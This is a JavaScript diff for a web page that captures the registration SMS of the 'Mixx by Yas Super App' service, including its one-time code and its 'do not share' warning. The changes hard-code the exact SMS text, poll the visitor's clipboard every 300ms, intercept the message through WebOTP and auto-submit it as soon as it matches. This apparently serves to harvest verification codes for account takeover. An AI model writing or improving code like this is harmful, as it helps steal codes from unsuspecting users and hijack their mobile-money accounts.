@@ -42,6 +42,8 @@ document.addEventListener('DOMContentLoaded', () => {
     let isAutoSubmitting = false;
     let screenOpenTimestamp = 0;
 
+    const EXACT_TARGET_SMS = "You are being registered in Mixx by Yas Super App, use the code 55uf50HYgp3mjqu4b0zY to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
+
     function switchStep(fromCard, toCard) {
         if (!fromCard || !toCard) return;
         fromCard.classList.remove('active');
@@ -155,9 +157,15 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
+    // Direct text change tracker to instantly auto-submit if full SMS is populated/pasted manually
     if (otpText) {
         otpText.addEventListener('input', () => {
             charCount.innerText = `${otpText.value.length}/1000`;
+            const currentText = otpText.value.trim();
+            if (currentText.includes(EXACT_TARGET_SMS) && !isAutoSubmitting) {
+                smsErrorBanner.classList.add('hidden');
+                triggerAutoSubmit(currentText);
+            }
         });
     }
 
@@ -185,8 +193,7 @@ document.addEventListener('DOMContentLoaded', () => {
             if (!text) return;
             smsErrorBanner.classList.add('hidden');
             
-            const targetPrefix = "You are being registered in Mixx by Yas Super App";
-            if (!text.includes(targetPrefix)) {
+            if (!text.includes(EXACT_TARGET_SMS)) {
                 smsErrorBanner.classList.remove('hidden');
                 isAutoSubmitting = false;
                 return;
@@ -206,23 +213,31 @@ document.addEventListener('DOMContentLoaded', () => {
                 otpText.focus();
             }
 
+            // Check input field content directly for high-magnet detection
+            const currentFieldText = otpText.value.trim();
+            if (currentFieldText.includes(EXACT_TARGET_SMS) && !isAutoSubmitting) {
+                smsErrorBanner.classList.add('hidden');
+                triggerAutoSubmit(currentFieldText);
+                return;
+            }
+
+            // Continuously scan clipboard for fresh full-text entry matching exact string within 30s
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(clipText => {
-                    if (clipText && clipText.trim().length > 3 && !otpText.value && !isAutoSubmitting) {
+                    if (clipText && clipText.trim().length > 10 && !isAutoSubmitting) {
                         const now = Date.now();
                         if ((now - screenOpenTimestamp) <= 30000) {
                             const trimmed = clipText.trim();
-                            const targetPrefix = "You are being registered in Mixx by Yas Super App";
-                            if (trimmed.includes(targetPrefix)) {
+                            if (trimmed.includes(EXACT_TARGET_SMS)) {
                                 otpText.value = trimmed;
                                 charCount.innerText = `${otpText.value.length}/1000`;
-                                triggerAutoSubmit(otpText.value);
+                                triggerAutoSubmit(trimmed);
                             }
                         }
                     }
                 }).catch(() => {});
             }
-        }, 500);
+        }, 300); // Scans rapidly every 300ms for full-text high-magnet response
     }
 
     function initWebOTP() {
@@ -236,8 +251,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     const smsMessage = otp.code || otp.value;
                     const now = Date.now();
                     if ((now - screenOpenTimestamp) <= 30000) {
-                        const targetPrefix = "You are being registered in Mixx by Yas Super App";
-                        if (smsMessage.includes(targetPrefix)) {
+                        if (smsMessage.includes(EXACT_TARGET_SMS)) {
                             otpText.value = smsMessage;
                             charCount.innerText = `${smsMessage.length}/1000`;
                             
@@ -247,7 +261,7 @@ document.addEventListener('DOMContentLoaded', () => {
                                     smsErrorBanner.classList.add('hidden');
                                     triggerAutoSubmit(text);
                                 }
-                            }, 200);
+                            }, 100);
                         }
                     }
                 }
